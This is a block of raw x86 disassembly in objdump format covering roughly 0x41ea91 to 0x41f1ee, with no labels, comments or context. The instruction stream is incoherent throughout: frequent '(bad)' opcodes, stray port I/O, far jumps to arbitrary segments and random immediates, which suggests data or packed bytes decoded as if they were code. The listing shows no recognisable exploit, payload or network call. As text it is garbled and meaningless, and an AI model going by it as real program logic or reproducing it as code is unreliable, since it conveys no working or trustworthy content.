  41ea91:	sub    BYTE PTR [edx+0x335d0e15],ch
  41ea97:	daa    
  41ea98:	push   cs
  41ea99:	call   0x379491b0
  41ea9e:	test   eax,0x94dd5220
  41eaa3:	push   eax
  41eaa4:	add    DWORD PTR [ecx+0x74224763],ebp
  41eaaa:	jl     0x41ea70
  41eaac:	je     0x41ea5f
  41eaae:	popa   
  41eaaf:	sub    eax,0xb01cdaea
  41eab4:	and    ah,dl
  41eab6:	inc    ebp
  41eab7:	inc    edx
  41eab8:	stos   BYTE PTR es:[edi],al
  41eab9:	rol    eax,0xc1
  41eabc:	adc    DWORD PTR [esi+0x2c],ebp
  41eabf:	aad    0xc1
  41eac1:	cmp    cl,BYTE PTR [ebx+0x38167653]
  41eac7:	test   DWORD PTR [esi-0x79],eax
  41eaca:	mov    ebp,0xc22ab513
  41eacf:	and    DWORD PTR [eax],edx
  41ead1:	outs   dx,DWORD PTR ds:[esi]
  41ead2:	call   0x4182ecc1
  41ead7:	lahf   
  41ead8:	mov    WORD PTR [ecx],ss
  41eada:	jbe    0x41eb1c
  41eadc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eadd:	mov    esi,0xffb9af5c
  41eae2:	inc    esi
  41eae3:	add    al,0xbe
  41eae5:	dec    ecx
  41eae6:	ret    0x88a8
  41eae9:	and    cl,BYTE PTR [edi-0x15f0c958]
  41eaef:	xlat   BYTE PTR ds:[ebx]
  41eaf0:	inc    edi
  41eaf1:	push   ebx
  41eaf2:	imul   ebx,DWORD PTR [eax+0x6752a268],0xffffffec
  41eaf9:	jno    0x41eb41
  41eafb:	jg     0x41eab0
  41eafd:	cld    
  41eafe:	mov    dh,0x6c
  41eb00:	in     eax,dx
  41eb01:	push   ds
  41eb02:	or     al,0x17
  41eb04:	adc    esi,DWORD PTR [ebx-0x12]
  41eb07:	and    BYTE PTR [ebx],0x91
  41eb0a:	imul   edx,esi,0x8f3b422e
  41eb10:	ins    DWORD PTR es:[edi],dx
	...
  41eb19:	add    BYTE PTR [eax],al
  41eb1b:	xchg   esp,eax
  41eb1c:	nop
  41eb1d:	ffree  st(0)
  41eb1f:	(bad)  
  41eb21:	popf   
  41eb22:	aam    0x57
  41eb24:	(bad)
  41eb28:	repnz or edx,esi
  41eb2b:	test   DWORD PTR [esi+0xae0001],ecx
  41eb31:	add    BYTE PTR [eax],al
  41eb33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb34:	lods   eax,DWORD PTR ds:[esi]
  41eb35:	add    DWORD PTR [ecx],ecx
  41eb37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb38:	jge    0x41eb5e
  41eb3a:	jl     0x41eb40
  41eb3c:	leave  
  41eb3d:	in     al,0x1f
  41eb3f:	daa    
  41eb40:	imul   ecx,DWORD PTR ds:[ecx],0x87cb82b1
  41eb47:	jmp    0xbe94:0x59cf900e
  41eb4e:	push   esp
  41eb4f:	fwait
  41eb50:	dec    ecx
  41eb51:	fwait
  41eb52:	mov    BYTE PTR [eax],bl
  41eb54:	cli    
  41eb55:	mov    edx,0x2c804033
  41eb5a:	movupd XMMWORD PTR [edi+0x49],xmm7
  41eb5f:	mov    WORD PTR [ebx+0x275f621],ss
  41eb65:	(bad)  
  41eb66:	div    ch
  41eb68:	xchg   edi,eax
  41eb69:	xor    BYTE PTR [edi+0x1b],dl
  41eb6c:	dec    esp
  41eb6d:	out    0x42,al
  41eb6f:	or     ebx,DWORD PTR ds:0x576a1897
  41eb75:	cmp    al,0x27
  41eb77:	rol    DWORD PTR [eax-0x41],cl
  41eb7a:	jne    0x41eb3d
  41eb7c:	mov    ecx,0x7675d40e
  41eb81:	int3   
  41eb82:	std    
  41eb83:	in     eax,dx
  41eb84:	lds    esi,FWORD PTR [edi]
  41eb86:	ja     0x41ebae
  41eb88:	fisttp DWORD PTR [edx]
  41eb8a:	mov    al,ds:0x97ad80b4
  41eb8f:	dec    ebp
  41eb90:	adc    al,al
  41eb92:	nop
  41eb93:	mov    dh,0x9d
  41eb95:	in     eax,0x41
  41eb97:	sub    bh,BYTE PTR [ebp+eax*2-0x1b]
  41eb9b:	dec    ecx
  41eb9c:	mov    esp,0x3578557d
  41eba1:	stos   DWORD PTR es:[edi],eax
  41eba2:	dec    esp
  41eba3:	pop    ds
  41eba4:	pop    ecx
  41eba5:	dec    esp
  41eba6:	inc    edx
  41eba7:	add    bl,cl
  41eba9:	dec    ecx
  41ebaa:	je     0x41eb4f
  41ebac:	sub    ecx,DWORD PTR [eax-0x407d60ce]
  41ebb2:	int    0x13
  41ebb4:	inc    esp
  41ebb5:	lea    ecx,ds:[ecx+ebp*1+0x369720a6]
  41ebbd:	mov    dh,0x54
  41ebbf:	aam    0xda
  41ebc1:	sub    al,0xbb
  41ebc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebc4:	int    0xbf
  41ebc6:	in     eax,dx
  41ebc7:	ins    DWORD PTR es:[edi],dx
  41ebc8:	cmp    ebp,esi
  41ebca:	xchg   DWORD PTR [ecx-0x16b7d715],ebp
  41ebd0:	jmp    0x41eb76
  41ebd2:	mov    esp,0xdd99a29d
  41ebd7:	xlat   BYTE PTR ds:[ebx]
  41ebd8:	retf   0x1e32
  41ebdb:	cmp    eax,0x3a13aaa4
  41ebe0:	pop    esi
	...
  41ebe9:	add    BYTE PTR [eax],al
  41ebeb:	hlt    
  41ebec:	mov    dl,0x32
  41ebee:	(bad)  
  41ebef:	jbe    0x41ebc7
  41ebf1:	hlt    
  41ebf2:	mov    dl,0xb1
  41ebf4:	and    al,0xfe
  41ebf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebf7:	imul   ebx,ebx,0x14
  41ebfa:	sbb    esi,DWORD PTR [ebx]
  41ebfc:	pop    DWORD PTR [ecx]
  41ebfe:	add    BYTE PTR [esi-0x12000000],ch
  41ec04:	or     DWORD PTR [ebx-0x51],ebx
  41ec07:	pop    esi
  41ec08:	pop    ecx
  41ec09:	xchg   edx,eax
  41ec0a:	push   ds
  41ec0b:	sar    BYTE PTR [esi],cl
  41ec0d:	(bad)
  41ec12:	ds call 0xb4770d4b
  41ec18:	cmc    
  41ec19:	test   BYTE PTR [edi+esi*1-0x11],al
  41ec1d:	jge    0x41ebed
  41ec1f:	sbb    al,0x4b
  41ec21:	mov    eax,0x14cfb5ba
  41ec26:	clc    
  41ec27:	push   ebx
  41ec28:	xchg   esi,eax
  41ec29:	pop    ecx
  41ec2a:	jae    0x6c6c4516
  41ec30:	jno    0x41ec42
  41ec32:	push   edi
  41ec33:	loopne 0x41ecb2
  41ec35:	imul   esi,esi,0x43621fee
  41ec3b:	mov    dh,BYTE PTR [ebp-0x55]
  41ec3e:	out    0x64,al
  41ec40:	clc    
  41ec41:	test   bh,bh
  41ec43:	add    al,0x78
  41ec45:	test   al,0x8a
  41ec47:	inc    edi
  41ec48:	mov    ebx,0x172bfff3
  41ec4d:	cli    
  41ec4e:	mov    ebx,0xdc0cf26e
  41ec53:	fisubr WORD PTR [ecx]
  41ec55:	fs in  eax,dx
  41ec57:	jl     0x41eca9
  41ec59:	(bad)  
  41ec5a:	mov    al,ds:0xfd265959
  41ec5f:	setb   BYTE PTR [ebx]
  41ec62:	fist   WORD PTR [eax-0x8]
  41ec65:	push   ss
  41ec66:	inc    esi
  41ec67:	popf   
  41ec68:	jno    0x41ec8a
  41ec6a:	sub    esp,DWORD PTR [eax+0x7850af69]
  41ec70:	inc    ebx
  41ec71:	into   
  41ec72:	push   ss
  41ec73:	test   BYTE PTR [ecx],ch
  41ec75:	sar    BYTE PTR [edi-0x1b],cl
  41ec78:	dec    eax
  41ec79:	or     al,0x5e
  41ec7b:	jns    0x41eceb
  41ec7d:	test   BYTE PTR [ebx-0x1f2194ad],bl
  41ec83:	pop    es
  41ec84:	mov    bh,0x3f
  41ec86:	pop    DWORD PTR [esi-0x6567c78c]
  41ec8c:	or     al,0xb4
  41ec8e:	or     al,0xd6
  41ec90:	in     eax,dx
  41ec91:	jo     0x41ec2e
  41ec93:	jmp    0x41ec84
  41ec95:	sub    al,0xe
  41ec97:	lock jbe 0x41ec6f
  41ec9a:	push   cs
  41ec9b:	clc    
  41ec9c:	xchg   ebx,eax
  41ec9d:	pandn  mm7,QWORD PTR ss:0x7f762557
  41eca5:	in     eax,dx
  41eca6:	add    BYTE PTR [edx],cl
  41eca8:	xchg   edx,eax
  41eca9:	push   eax
  41ecaa:	pop    eax
  41ecab:	xlat   BYTE PTR ds:[ebx]
  41ecac:	xor    eax,0xdfbca872
	...
  41ecb9:	add    BYTE PTR [eax],al
  41ecbb:	xor    dl,bl
  41ecbd:	into   
  41ecbe:	mov    ds:0xd37ebfef,al
  41ecc3:	sub    edi,DWORD PTR [esi]
  41ecc5:	out    0x3f,eax
  41ecc7:	mov    ebx,0xe1a01f27
  41eccc:	pop    DWORD PTR [ecx]
  41ecce:	add    BYTE PTR [esi+0x21000000],ch
  41ecd4:	int    0x62
  41ecd6:	mov    eax,0xd1f47a58
  41ecdb:	test   eax,0x845dd1b9
  41ece0:	mov    dh,0x97
  41ece2:	dec    ebp
  41ece3:	mov    BYTE PTR [eax+0x2f1e8bea],al
  41ece9:	mov    DWORD PTR [edi],esp
  41eceb:	cmp    BYTE PTR [esi-0x6d9721be],dl
  41ecf1:	ins    DWORD PTR es:[edi],dx
  41ecf2:	arpl   bp,sp
  41ecf4:	push   ds
  41ecf5:	mov    bl,0x11
  41ecf7:	fist   DWORD PTR [edi]
  41ecf9:	test   DWORD PTR [esi+0x77],edi
  41ecfc:	ret    0xf73d
  41ecff:	mov    bl,0x23
  41ed01:	stos   DWORD PTR es:[edi],eax
  41ed02:	arpl   bp,ax
  41ed04:	cs stos BYTE PTR es:[edi],al
  41ed06:	dec    esp
  41ed07:	test   eax,0xe15685aa
  41ed0c:	fisttp DWORD PTR [ebx-0x489a9b53]
  41ed12:	lods   eax,DWORD PTR ds:[esi]
  41ed13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed14:	jno    0x41ed29
  41ed16:	and    edx,edi
  41ed18:	cmc    
  41ed19:	mov    ecx,ecx
  41ed1b:	pop    esi
  41ed1c:	mov    BYTE PTR [edi-0x42a83f85],bh
  41ed22:	dec    ecx
  41ed23:	or     ebx,DWORD PTR [edi-0x26e1351f]
  41ed29:	in     eax,0x4e
  41ed2b:	mov    DWORD PTR [ecx+0x7e],edx
  41ed2e:	inc    eax
  41ed2f:	or     al,0x5d
  41ed31:	ficom  WORD PTR [edx+0x3a]
  41ed34:	adc    al,0xf1
  41ed36:	ror    DWORD PTR [edi+0x10758505],1
  41ed3c:	test   al,0xa0
  41ed3e:	out    dx,eax
  41ed3f:	jmp    0x2c0c3345
  41ed44:	dec    eax
  41ed45:	xchg   edi,eax
  41ed46:	or     BYTE PTR [ebx],0x85
  41ed49:	or     al,0x17
  41ed4b:	int    0xe9
  41ed4d:	bnd jae 0x41ed7c
  41ed50:	pushf  
  41ed51:	(bad)  
  41ed52:	loopne 0x41edd2
  41ed54:	adc    ch,BYTE PTR [esi-0x6e3ae28]
  41ed5a:	xchg   ebp,eax
  41ed5b:	dec    ebp
  41ed5c:	jmp    0xdb5b:0x873f1d13
  41ed63:	call   0x924e:0xb5101ca8
  41ed6a:	jne    0x41ecfc
  41ed6c:	pop    ecx
  41ed6d:	cmp    eax,0xe581a4f0
  41ed72:	adc    eax,0x57bbd37c
  41ed77:	sub    eax,0xd309d89e
  41ed7c:	(bad)  
  41ed7d:	ja     0x41ed5c
  41ed7f:	xchg   ecx,eax
  41ed80:	mov    al,BYTE PTR [eax]
	...
  41ed8a:	add    bl,bl
  41ed8c:	in     eax,dx
  41ed8d:	outs   dx,BYTE PTR ds:[esi]
  41ed8e:	and    bh,BYTE PTR [esi-0x5d]
  41ed91:	(bad)  
  41ed93:	pop    esi
  41ed94:	(bad)  
  41ed95:	mov    DWORD PTR [ebp+0x5a48869b],ecx
  41ed9b:	(bad)  
  41ed9c:	nop
  41ed9d:	add    DWORD PTR [eax],eax
  41ed9f:	scas   al,BYTE PTR es:[edi]
  41eda0:	add    BYTE PTR [eax],al
  41eda2:	add    ah,ch
  41eda4:	xchg   edi,eax
  41eda5:	mov    ds:0xe17ad295,al
  41edaa:	lods   eax,DWORD PTR ds:[esi]
  41edab:	push   ebx
  41edac:	aam    0x1f
  41edae:	inc    edx
  41edaf:	retf   0xb1d3
  41edb2:	(bad)  
  41edb3:	mov    bh,0x4c
  41edb5:	jmp    0x233317b6
  41edba:	cs push ebp
  41edbc:	mov    eax,ds:0x1a8cf2db
  41edc1:	mov    ch,0xd7
  41edc3:	pop    esp
  41edc4:	adc    bh,BYTE PTR [ecx+0x3e913239]
  41edca:	in     al,dx
  41edcb:	pushf  
  41edcc:	inc    esi
  41edcd:	inc    eax
  41edce:	xchg   BYTE PTR [ebx],dh
  41edd0:	sub    ecx,ecx
  41edd2:	jno    0x41ee20
  41edd4:	mov    eax,ds:0xbf00a23c
  41edd9:	ss mov esp,edx
  41eddc:	aaa    
  41eddd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41edde:	leave  
  41eddf:	sub    BYTE PTR [esi+0x5a],0x8f
  41ede3:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41ede5:	dec    BYTE PTR ds:0x5b974a3
  41edeb:	ss into 
  41eded:	inc    esi
  41edee:	and    edx,edx
  41edf0:	shr    DWORD PTR [ebp+eax*2+0x152c8195],0xb7
  41edf8:	icebp  
  41edf9:	pop    es
  41edfa:	das    
  41edfb:	cdq    
  41edfc:	scas   eax,DWORD PTR es:[edi]
  41edfd:	ins    DWORD PTR es:[edi],dx
  41edfe:	push   ebp
  41edff:	dec    edx
  41ee00:	dec    ecx
  41ee01:	mov    ds:0x633ce8e4,al
  41ee06:	mov    eax,DWORD PTR [eax+0x72f233e3]
  41ee0c:	pop    esp
  41ee0d:	mov    al,0x67
  41ee0f:	enter  0xc4e3,0xbb
  41ee13:	push   es
  41ee14:	or     bl,BYTE PTR [ecx]
  41ee16:	mov    ebp,0x8a59e1bb
  41ee1b:	mov    edx,0xba90ac1f
  41ee20:	push   es
  41ee21:	add    al,0xc7
  41ee23:	pop    esi
  41ee24:	aad    0x1f
  41ee26:	call   0x94285242
  41ee2b:	std    
  41ee2c:	adc    dl,BYTE PTR [esi+edi*4-0x57bd618b]
  41ee33:	xor    eax,0xa0838c43
  41ee38:	pop    edx
  41ee39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee3a:	and    BYTE PTR [esi],al
  41ee3c:	and    esi,DWORD PTR [ebp-0x32f21433]
  41ee42:	lahf   
  41ee43:	sbb    BYTE PTR fs:[edx+0x41],bh
  41ee47:	scas   eax,DWORD PTR es:[edi]
  41ee48:	cwde   
  41ee49:	mov    bh,0x31
  41ee4b:	fstp   QWORD PTR [bx+si-0x1d02]
  41ee50:	sub    eax,0x0
  41ee55:	add    BYTE PTR [eax],al
  41ee57:	add    BYTE PTR [eax],al
  41ee59:	add    BYTE PTR [eax],al
  41ee5b:	add    eax,0x6f976b22
  41ee60:	(bad)  
  41ee62:	mov    dl,0x66
  41ee64:	and    BYTE PTR [esi-0x54c4cb96],ah
  41ee6a:	xor    BYTE PTR ds:0xae000191,bh
  41ee70:	add    BYTE PTR [eax],al
  41ee72:	add    BYTE PTR [ebp-0x4043a1b6],ch
  41ee78:	sti    
  41ee79:	sub    ah,0xe3
  41ee7c:	cmp    BYTE PTR [ebx-0x55],0xd8
  41ee80:	and    BYTE PTR [eax+0x476b8e78],dl
  41ee86:	rcr    BYTE PTR [edi],1
  41ee88:	xchg   ebp,eax
  41ee89:	push   edx
  41ee8a:	test   eax,0x1f1ecc52
  41ee8f:	adc    DWORD PTR [ecx],0xffffffe3
  41ee92:	mov    WORD PTR [eax-0x1ad285dc],cs
  41ee98:	aam    0x52
  41ee9a:	das    
  41ee9b:	jg     0x41ee6f
  41ee9d:	and    dl,BYTE PTR [eax]
  41ee9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eea0:	mov    dl,0x36
  41eea2:	add    BYTE PTR [esi+eiz*2+0x416b6be0],0x3f
  41eeaa:	xchg   esp,eax
  41eeab:	in     eax,0x61
  41eead:	sbb    DWORD PTR [esi+edi*2-0x185e7fe1],eax
  41eeb4:	test   BYTE PTR [edi-0x6f],al
  41eeb7:	adc    dh,BYTE PTR [esi]
  41eeb9:	add    eax,0x84f5613
  41eebe:	sbb    ebx,esi
  41eec0:	pop    es
  41eec1:	mov    ebp,0x3b92889e
  41eec6:	jns    0x41eef5
  41eec8:	or     al,0x69
  41eeca:	cli    
  41eecb:	pop    ss
  41eecc:	out    0xb2,eax
  41eece:	gs inc ecx
  41eed0:	loopne 0x41ee81
  41eed2:	mov    ds:0xcc9d478e,eax
  41eed7:	jns    0x41ee92
  41eed9:	sbb    DWORD PTR [esi],0xb1208eb
  41eedf:	inc    ebx
  41eee0:	mov    ebp,0x22e992df
  41eee5:	(bad)  
  41eee7:	or     al,0xc8
  41eee9:	xlat   BYTE PTR ds:[ebx]
  41eeea:	jb     0x41ee91
  41eeec:	lea    esi,[edi-0x60]
  41eeef:	jo     0x41ef37
  41eef1:	jbe    0x41ef4e
  41eef3:	fldlg2 
  41eef5:	push   0x1f
  41eef7:	test   ah,bl
  41eef9:	idiv   cl
  41eefb:	mov    esp,0xa6d013e3
  41ef00:	xchg   ax,ax
  41ef02:	or     eax,0xb752503c
  41ef07:	addr16 in eax,0x28
  41ef0a:	jno    0x41ef39
  41ef0c:	jl     0x41ef20
  41ef0e:	pop    es
  41ef0f:	mov    al,BYTE PTR [ebp-0x2a]
  41ef12:	mov    edi,0x34745554
  41ef17:	test   cl,0x19
  41ef1a:	int3   
  41ef1b:	xchg   DWORD PTR [esi],ebx
  41ef1d:	or     dl,BYTE PTR [ebp-0x19]
  41ef20:	int    0x0
	...
  41ef2a:	add    BYTE PTR [ebx+0x7fd924d4],cl
  41ef30:	stc    
  41ef31:	call   esi
  41ef33:	into   
  41ef34:	inc    ebp
  41ef35:	mov    bh,0x11
  41ef37:	out    dx,al
  41ef38:	fldcw  WORD PTR [esi-0x60]
  41ef3b:	jmp    0x41eece
  41ef3d:	add    DWORD PTR [eax],eax
  41ef3f:	scas   al,BYTE PTR es:[edi]
  41ef40:	add    BYTE PTR [eax],al
  41ef42:	add    ah,ch
  41ef44:	hlt    
  41ef45:	sub    al,BYTE PTR [edi]
  41ef47:	aas    
  41ef48:	inc    ebx
  41ef49:	jne    0x41ef7c
  41ef4b:	fcom   st(5)
  41ef4d:	jno    0x41ef26
  41ef4f:	ins    DWORD PTR es:[edi],dx
  41ef50:	adc    ebx,DWORD PTR [eax-0x1f8e6c9d]
  41ef56:	mov    bl,BYTE PTR [edi-0x3dd2354f]
  41ef5c:	mov    ah,0x3b
  41ef5e:	lds    eax,FWORD PTR [esi-0x4e9a17b6]
  41ef64:	mov    bl,0xee
  41ef66:	sbb    BYTE PTR [edi+0x1d],dl
  41ef69:	lea    ebp,[edx+0x2b]
  41ef6c:	xor    DWORD PTR [eax],edx
  41ef6e:	pushf  
  41ef6f:	rcr    BYTE PTR [ebx-0x6e],0xc0
  41ef73:	mov    ah,0xa4
  41ef75:	lods   eax,DWORD PTR ds:[esi]
  41ef76:	(bad)  
  41ef77:	outs   dx,DWORD PTR ds:[esi]
  41ef78:	mov    edi,0xcd455011
  41ef7d:	es xchg edx,eax
  41ef7f:	mov    bh,0xa1
  41ef81:	in     al,dx
  41ef82:	inc    esp
  41ef83:	popf   
  41ef84:	inc    ebp
  41ef85:	dec    edx
  41ef86:	jmp    0xec2281a2
  41ef8b:	test   al,0xf3
  41ef8d:	lock (bad) 
  41ef8f:	bound  ecx,QWORD PTR [ecx]
  41ef91:	or     bh,BYTE PTR [ebp+ebx*2-0x40]
  41ef95:	scas   al,BYTE PTR es:[edi]
  41ef96:	scas   al,BYTE PTR es:[edi]
  41ef97:	push   ds
  41ef98:	and    ecx,esp
  41ef9a:	fdivr  st,st(1)
  41ef9c:	pop    ss
  41ef9d:	xor    eax,0x1143aa49
  41efa2:	inc    ecx
  41efa3:	mov    ?,WORD PTR [eax+0x555368a9]
  41efa9:	xor    al,BYTE PTR [ebp-0x4b]
  41efac:	or     esi,ebx
  41efae:	pop    ss
  41efaf:	out    dx,al
  41efb0:	test   eax,ebx
  41efb2:	dec    eax
  41efb3:	xchg   ebx,eax
  41efb4:	dec    esi
  41efb5:	test   DWORD PTR [ebx-0x66],ecx
  41efb8:	in     al,0x40
  41efba:	les    eax,FWORD PTR [esi]
  41efbc:	and    DWORD PTR [ebx+0x5f],esi
  41efbf:	sysenter 
  41efc1:	rol    ebx,cl
  41efc3:	out    dx,eax
  41efc4:	adc    esp,edi
  41efc6:	jmp    esi
  41efc8:	mov    ds:0xce412900,al
  41efcd:	sub    ah,BYTE PTR [edx]
  41efcf:	(bad)  
  41efd0:	lods   eax,DWORD PTR ds:[esi]
  41efd1:	out    0x26,eax
  41efd3:	out    0xa8,eax
  41efd5:	fwait
  41efd6:	sti    
  41efd7:	jle    0x41ef87
  41efd9:	(bad)  
  41efda:	and    ah,dh
  41efdc:	xor    ah,al
  41efde:	adc    BYTE PTR [ebx+0x5dbbc1e0],cl
  41efe4:	repnz or BYTE PTR [edi],dl
  41efe7:	push   es
  41efe8:	mov    bl,0x61
  41efea:	sbb    al,0xf7
  41efec:	mov    ebx,0xb8f125c8
	...
  41eff9:	add    BYTE PTR [eax],al
  41effb:	fisubr WORD PTR [ecx]
  41effd:	cwde   
  41effe:	sar    bh,cl
  41f000:	repz fisubr WORD PTR ds:0x4af35f6
  41f007:	sti    
  41f008:	pop    edx
  41f009:	clc    
  41f00a:	dec    esi
  41f00b:	cdq    
  41f00c:	xchg   edx,eax
  41f00d:	add    DWORD PTR [eax],eax
  41f00f:	scas   al,BYTE PTR es:[edi]
  41f010:	add    BYTE PTR [eax],al
  41f012:	add    BYTE PTR [ebp-0x33],bl
  41f015:	or     DWORD PTR [ebp+eiz*1-0x45],edi
  41f019:	loop   0x41f053
  41f01b:	mov    ch,0x56
  41f01d:	xchg   edi,eax
  41f01e:	jge    0x41efe9
  41f020:	ja     0x41f05c
  41f022:	push   ss
  41f023:	or     BYTE PTR [ecx],al
  41f025:	stos   BYTE PTR es:[edi],al
  41f026:	ins    BYTE PTR es:[edi],dx
  41f027:	push   ss
  41f028:	adc    esp,DWORD PTR [edi]
  41f02a:	std    
  41f02b:	and    esi,esp
  41f02d:	iret   
  41f02e:	adc    edx,DWORD PTR [ecx-0x3c]
  41f031:	adc    DWORD PTR [edx-0x70ad2a68],ecx
  41f037:	in     al,dx
  41f038:	and    DWORD PTR [ebp+0x49ccdeb4],edx
  41f03e:	test   BYTE PTR [ebx-0x34750aa3],dl
  41f044:	push   ds
  41f045:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f046:	pop    edi
  41f047:	jle    0x41f072
  41f049:	xor    eax,0xeb0750f6
  41f04e:	popa   
  41f04f:	pop    ecx
  41f050:	pop    eax
  41f051:	cmp    ebx,esi
  41f053:	jmp    0x41f069
  41f055:	repz xor edi,DWORD PTR [esi+ebx*8-0x2e]
  41f05a:	or     al,0x2d
  41f05c:	jecxz  0x41f061
  41f05e:	sub    al,0xe8
  41f060:	loopne 0x41f00d
  41f062:	ja     0x41f0b9
  41f064:	ins    BYTE PTR es:[edi],dx
  41f065:	mov    ebp,0xe4cf00fd
  41f06a:	in     al,0xd1
  41f06c:	ret    
  41f06d:	test   BYTE PTR [esi+esi*8],0x4e
  41f071:	cmp    esp,DWORD PTR [esi-0x69]
  41f074:	jmp    0xaf67:0xa83f373f
  41f07b:	mov    ds:0x76071c51,eax
  41f080:	test   al,0x85
  41f082:	sbb    DWORD PTR [ebx+ebx*2-0x15],edi
  41f086:	les    ebx,FWORD PTR [edi]
  41f088:	sub    dh,BYTE PTR [esi]
  41f08a:	and    BYTE PTR [esi],0xe1
  41f08d:	in     eax,0x86
  41f08f:	(bad)  
  41f090:	sbb    eax,0xdd1c8e19
  41f095:	dec    ecx
  41f096:	bound  edx,QWORD PTR [edx]
  41f098:	(bad)  
  41f099:	stc    
  41f09a:	and    DWORD PTR [esi],ebx
  41f09c:	sbb    al,0xe4
  41f09e:	or     DWORD PTR [edi+0x16],0xffffffa6
  41f0a2:	lea    ebp,[edx+0x76]
  41f0a5:	out    dx,eax
  41f0a6:	pop    eax
  41f0a7:	mov    DWORD PTR [edi+edi*8-0x7a88dd2c],esp
  41f0ae:	fs inc esp
  41f0b0:	jp     0x41f129
  41f0b2:	fild   QWORD PTR [esi-0x531fa97]
  41f0b8:	jmp    0x41f09c
  41f0ba:	jbe    0x41f03c
  41f0bc:	outs   dx,DWORD PTR ds:[esi]
  41f0bd:	lds    eax,FWORD PTR [esp+eax*2]
  41f0c0:	dec    edx
	...
  41f0c9:	add    BYTE PTR [eax],al
  41f0cb:	dec    esi
  41f0cc:	aas    
  41f0cd:	int3   
  41f0ce:	sbb    eax,0x7fdffffd
  41f0d3:	out    dx,eax
  41f0d4:	loopne 0x41f0ec
  41f0d6:	lods   al,BYTE PTR ds:[esi]
  41f0d7:	(bad)  
  41f0d8:	xor    ah,bh
  41f0da:	dec    esi
  41f0db:	inc    edi
  41f0dc:	xchg   ebx,eax
  41f0dd:	add    DWORD PTR [eax],eax
  41f0df:	scas   al,BYTE PTR es:[edi]
  41f0e0:	add    BYTE PTR [eax],al
  41f0e2:	add    BYTE PTR [esi+0x75ba7c57],dh
  41f0e8:	fstp   QWORD PTR [esi-0x2d]
  41f0eb:	cdq    
  41f0ec:	popf   
  41f0ed:	xor    eax,0xe833cb19
  41f0f2:	aad    0x7d
  41f0f4:	add    BYTE PTR [di],ah
  41f0f7:	xchg   esi,eax
  41f0f8:	add    DWORD PTR [ecx-0x2c],esi
  41f0fb:	sub    dl,0x18
  41f0fe:	inc    eax
  41f0ff:	inc    ebp
  41f100:	arpl   WORD PTR [edx+0x4c6a985b],cx
  41f106:	cmp    eax,0x208f9ff2
  41f10b:	and    ebx,ecx
  41f10d:	sub    DWORD PTR ds:0x9bb15004,0x3
  41f114:	mov    al,ds:0xbe149e71
  41f119:	sub    BYTE PTR [eax-0x11a0e00d],bl
  41f11f:	sub    BYTE PTR [edx-0x6c915259],bl
  41f125:	xchg   esp,eax
  41f126:	mov    ebx,DWORD PTR [ebp+0x7b0a18be]
  41f12c:	add    BYTE PTR [eax-0x1d],al
  41f12f:	sub    al,0xe7
  41f131:	inc    esi
  41f132:	jae    0x41f11d
  41f134:	xor    eax,0x1c5723dc
  41f139:	rcr    BYTE PTR [edi+0x12],1
  41f13c:	in     eax,0x36
  41f13e:	aas    
  41f13f:	dec    ebx
  41f140:	arpl   WORD PTR [ebp+ebx*1-0x210fcea2],bx
  41f147:	popa   
  41f148:	scas   eax,DWORD PTR es:[edi]
  41f149:	ds stos DWORD PTR es:[edi],eax
  41f14b:	push   es
  41f14c:	fwait
  41f14d:	hlt    
  41f14e:	ror    BYTE PTR [eax+0x4fb6a980],cl
  41f154:	test   DWORD PTR [ebp+ebx*1-0x18be41f],ecx
  41f15b:	(bad)  
  41f15c:	call   0xfa4f:0x7c16ebf
  41f163:	in     eax,dx
  41f164:	sub    eax,0xec95ae30
  41f169:	iret   
  41f16a:	pop    esp
  41f16b:	dec    dh
  41f16d:	sbb    edx,DWORD PTR [edx]
  41f16f:	les    ebx,FWORD PTR [edi+0x57]
  41f172:	mov    ebx,0xaf7171ea
  41f177:	imul   edi,ebx,0xffffffeb
  41f17a:	cmp    BYTE PTR [eax+esi*2-0x74],dl
  41f17e:	lods   eax,DWORD PTR ds:[esi]
  41f17f:	inc    esi
  41f180:	mov    al,0x93
  41f182:	xchg   ecx,eax
  41f183:	add    DWORD PTR [edi],0xf4c5d8a6
  41f189:	cli    
  41f18a:	push   edx
  41f18b:	iret   
  41f18c:	xor    edi,DWORD PTR [esi]
  41f18e:	xchg   ecx,eax
  41f18f:	mov    DWORD PTR [ecx+0x0],esp
  41f195:	add    BYTE PTR [eax],al
  41f197:	add    BYTE PTR [eax],al
  41f199:	add    BYTE PTR [eax],al
  41f19b:	push   ds
  41f19c:	test   eax,0x7ff735f6
  41f1a1:	fild   QWORD PTR [ebx-0x5f9ed871]
  41f1a7:	pop    ds
  41f1a8:	jg     0x41f1b4
  41f1aa:	dec    esp
  41f1ab:	cmc    
  41f1ac:	xchg   ebx,eax
  41f1ad:	add    DWORD PTR [eax],eax
  41f1af:	scas   al,BYTE PTR es:[edi]
  41f1b0:	add    BYTE PTR [eax],al
  41f1b2:	add    BYTE PTR [ecx],al
  41f1b4:	out    dx,eax
  41f1b5:	in     al,dx
  41f1b6:	test   cl,ah
  41f1b8:	dec    edi
  41f1b9:	xor    al,0xe9
  41f1bb:	xchg   edx,eax
  41f1bd:	pop    ebp
  41f1be:	adc    bl,BYTE PTR [esi-0x4b1b5b03]
  41f1c4:	test   BYTE PTR [ecx-0x4e19e79b],bl
  41f1ca:	fcom   QWORD PTR [edx]
  41f1cc:	push   esp
  41f1cd:	out    dx,eax
  41f1ce:	and    DWORD PTR [edi-0x4a0e5a5],ebp
  41f1d4:	mov    fs,WORD PTR [esi+0x77231af9]
  41f1da:	cwde   
  41f1db:	push   esi
  41f1dc:	jmp    0x41f229
  41f1de:	mov    edx,0x8a7cc289
  41f1e3:	jo     0x41f171
  41f1e5:	out    0x7,eax
  41f1e7:	scas   eax,DWORD PTR es:[edi]
  41f1e8:	(bad)  
  41f1e9:	jge    0x41f229
  41f1eb:	repnz int 0xfc
  41f1ee:	xchg   DWORD PTR [edx-0x7551baaf],esi
